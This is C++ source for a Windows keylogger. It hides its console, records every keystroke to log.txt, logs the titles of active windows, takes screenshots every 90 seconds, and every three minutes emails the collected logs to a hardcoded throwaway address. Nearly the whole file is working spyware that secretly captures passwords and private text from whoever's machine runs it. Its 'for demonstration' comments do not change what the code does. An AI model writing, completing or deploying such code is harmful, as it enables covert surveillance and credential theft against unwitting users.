#define _WIN32_WINNT 0x501
#include<bits/stdc++.h>
#include "Headers.h"
#include<windows.h>
#include<time.h>

using namespace std;

bool numUnlocked = true;
int capsCount=0,ssCount=1;
time_t start, endt;
double elapsed, prev_elapsed = 0.0, mail_elapsed = 0.0;
char last_window[256] = "siam";

#define default_mail "mdsiam01@sharklasers.com"
#define EMAIL_TIME 180.0  //3 minutes (keeping low for demonstration)
#define SS_TIME 90.0  //1.5 minutes (keeping low for demonstration)

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,0);

}

int save(int _key, char const *file)
{
    cout << _key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen (file,"a+");
    if((_key>=48)&&(_key<=57))
    {
        if(GetAsyncKeyState(VK_SHIFT))
        {

            if(_key==48)
                fputc(')',OUTPUT_FILE);
            if(_key==49)
                fputc('!',OUTPUT_FILE);
            if(_key==50)
                fputc('@',OUTPUT_FILE);
            if(_key==51)
                fputc('#',OUTPUT_FILE);
            if(_key==52)
                fputc('$',OUTPUT_FILE);
            if(_key==53)
                fputc('%',OUTPUT_FILE);
            if(_key==54)
                fputc('^',OUTPUT_FILE);
            if(_key==55)
                fputc('&',OUTPUT_FILE);
            if(_key==56)
                fputc('*',OUTPUT_FILE);
            if(_key==57)
                fputc('(',OUTPUT_FILE);

        }
        else
            fputc(_key,OUTPUT_FILE);
    }
    else if((_key>64)&&(_key<91))
    {
        if(!((GetAsyncKeyState(VK_SHIFT)&0x8000)^(capsCount%2==1)))
        {
            cout<< capsCount%2<<endl;
            _key+=32;
            fputc(_key,OUTPUT_FILE);
        }
        else
            fputc(_key,OUTPUT_FILE);

    }
    else if( _key == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if( _key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "\n[LBUTTON]\n");
    else if( _key == VK_CANCEL)
        fprintf(OUTPUT_FILE, "%s", "\n[CANCEL]\n");
    else if( _key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "\n[RETURN]\n");
    else if( _key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "\n[ESCAPE]\n");
    else if( _key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "\n[BACKSPACE]\n");
    else if( _key == VK_RBUTTON)
        fprintf(OUTPUT_FILE, "%s", "\n[RBUTTON]\n");
    else if( _key == VK_CAPITAL)
    {
        fprintf(OUTPUT_FILE, "%s", "\n[CAPSLOCK]\n");
        capsCount++;
        printf("caps: %d",capsCount);
    }
    else if( _key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "\n[TAB]\n");
    else if( _key == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "\n[UP_ARROW]\n");
    else if( _key == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "\n[DOWN_ARROW]\n");
    else if( _key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "\n[LEFT_ARROW]\n");
    else if( _key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "\n[RIGHT_ARROW]\n");
    else if( _key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "\n[CTRL]\n");
    else if( _key == VK_OEM_PERIOD)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", ">");
        else
            fprintf(OUTPUT_FILE, "%s", ".");
    }
    else if( _key == VK_OEM_2)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "?");
        else
            fprintf(OUTPUT_FILE, "%s", "/");
    }

    else if( _key == VK_OEM_3)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "~");
        else
            fprintf(OUTPUT_FILE, "%s", "`");
    }
    else if( _key == VK_OEM_4)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "{");
        else
            fprintf(OUTPUT_FILE, "%s", "[");
    }
    else if( _key == VK_OEM_5)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "|");
        else
            fprintf(OUTPUT_FILE, "%s", "\\");
    }
    else if( _key == VK_OEM_6)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "}");
        else
            fprintf(OUTPUT_FILE, "%s", "]");
    }
    else if( _key == VK_OEM_7)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "\"");
        else
            fprintf(OUTPUT_FILE, "%s", "'");
    }
    else if( _key == 0xBC)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "<");
        else
            fprintf(OUTPUT_FILE, "%s", ",");
    }
    else if( _key == 0xBE)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", ">");
        else
            fprintf(OUTPUT_FILE, "%s", ".");
    }
    else if( _key == 0xBA)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", ":");
        else
            fprintf(OUTPUT_FILE, "%s", ";");
    }
    else if( _key == 0xBD)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "_");
        else
            fprintf(OUTPUT_FILE, "%s", "-");
    }
    else if( _key == 0xBB)
    {
        if(GetAsyncKeyState(VK_SHIFT))
            fprintf(OUTPUT_FILE, "%s", "+");
        else
            fprintf(OUTPUT_FILE, "%s", "=");
    }
    else if( _key == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "\n[HOME]\n");
    else if( _key == VK_INSERT)
        fprintf(OUTPUT_FILE, "%s", "\n[INSERT]\n");
    else if( _key == VK_PAUSE)
        fprintf(OUTPUT_FILE, "%s", "\n[PAUSE]\n");
    else if( _key == VK_SELECT)
        fprintf(OUTPUT_FILE, "%s", "\n[SELECT]\n");
    else if( _key == VK_HELP)
        fprintf(OUTPUT_FILE, "%s", "\n[HELP]\n");
    else if( _key == VK_EXECUTE)
        fprintf(OUTPUT_FILE, "%s", "\n[EXECUTE]\n");
    else if( _key == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "\n[DELETE]\n");
    else if( _key == VK_CLEAR)
        fprintf(OUTPUT_FILE, "%s", "\n[CLEAR]\n");
    else if( _key == VK_NUMLOCK)
    {
        fprintf(OUTPUT_FILE, "%s", "\n[NumLock]\n");
        numUnlocked = !numUnlocked;
    }


    else if( _key == VK_NUMPAD0)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "0");
    }
    else if( _key == VK_NUMPAD1)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "1");
    }
    else if( _key == VK_NUMPAD2)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "2");
    }
    else if( _key == VK_NUMPAD3)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "3");
    }
    else if( _key == VK_NUMPAD4)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "4");
    }
    else if( _key == VK_NUMPAD5)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "5");
    }
    else if( _key == VK_NUMPAD6)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "6");
    }
    else if( _key == VK_NUMPAD7)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "7");
    }
    else if( _key == VK_NUMPAD8)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "8");
    }
    else if( _key == VK_NUMPAD9)
    {
        if(numUnlocked)
        fprintf(OUTPUT_FILE, "%s", "9");
    }
    else if( _key == VK_F1)
        fprintf(OUTPUT_FILE, "%s", "\n[F1]\n");
    else if( _key == VK_F2)
        fprintf(OUTPUT_FILE, "%s", "\n[F2]\n");
    else if( _key == VK_F3)
        fprintf(OUTPUT_FILE, "%s", "\n[F3]\n");
    else if( _key == VK_F4)
        fprintf(OUTPUT_FILE, "%s", "\n[F4]\n");
    else if( _key == VK_F5)
        fprintf(OUTPUT_FILE, "%s", "\n[F5]\n");
    else if( _key == VK_F6)
        fprintf(OUTPUT_FILE, "%s", "\n[F6]\n");
    else if( _key == VK_F7)
        fprintf(OUTPUT_FILE, "%s", "\n[F7]\n");
    else if( _key == VK_F8)
        fprintf(OUTPUT_FILE, "%s", "\n[F8]\n");
    else if( _key == VK_F9)
        fprintf(OUTPUT_FILE, "%s", "\n[F9]\n");
    else if( _key == VK_F10)
        fprintf(OUTPUT_FILE, "%s", "\n[F10]\n");
    else if( _key == VK_F11)
        fprintf(OUTPUT_FILE, "%s", "\n[F11]\n");
    else if( _key == VK_F12)
        fprintf(OUTPUT_FILE, "%s", "\n[F12]\n");
    else if( _key == VK_SCROLL)
        fprintf(OUTPUT_FILE, "%s", "\n[SCROLL]\n");
    else if( _key == VK_END)
        fprintf(OUTPUT_FILE, "%s", "\n[END]\n");
    else if( _key == VK_DIVIDE)
        fprintf(OUTPUT_FILE, "%s", "/");
    else if( _key == VK_MULTIPLY)
        fprintf(OUTPUT_FILE, "%s", "*");
    else if( _key == VK_ADD)
        fprintf(OUTPUT_FILE, "%s", "+");
    else if( _key == VK_PRIOR)
        fprintf(OUTPUT_FILE, "%s", "\n[PageUp]\n");
    else if( _key == VK_NEXT)
        fprintf(OUTPUT_FILE, "%s", "\n[PageDown]\n");
    else if( _key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "\n[LEFT]\n");
    else if( _key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "\n[RIGHT]\n");
    else if( _key == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "\n[UP]\n");
    fclose(OUTPUT_FILE);
    return 0;
}

void trackWindowChanges()
{
    HWND foreground = GetForegroundWindow();
    char this_window[256];

    GetWindowText(foreground, this_window, 256);
        //cout<<this_window<<endl;
    if(strcmp(last_window,this_window)!=0)
    {

        strcpy(last_window,this_window);
        FILE* fileP = fopen("windows.txt","a");
        cout<< this_window<<endl;
        fprintf(fileP, "%s\n", this_window);
        fclose(fileP);
    }

}

void logKeys()
{
    short i;
    while(1)
    {
        time(&endt);

        elapsed = difftime(endt, start);
        if (elapsed >= prev_elapsed+SS_TIME)
        {
            char nameOfScreenshot[20];
            snprintf(nameOfScreenshot, 20, "image%d.bmp", ssCount); // puts string into buffer
            printf("%s\n", nameOfScreenshot);
            ssCount++;
            ScreenCapture(nameOfScreenshot);

            prev_elapsed = elapsed;
        }

        if (elapsed >= mail_elapsed+EMAIL_TIME)
        {
            mailMyLog(default_mail);
            mail_elapsed = elapsed;
        }

        trackWindowChanges();

        Sleep(10);

        for(i=0;i<255;i++)
        {
            if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
                authentication(ssCount);
            if(GetAsyncKeyState(i)==-32767)
            {
                save(i,"log.txt");
            }
        }

        //system("PAUSE");
    }
}

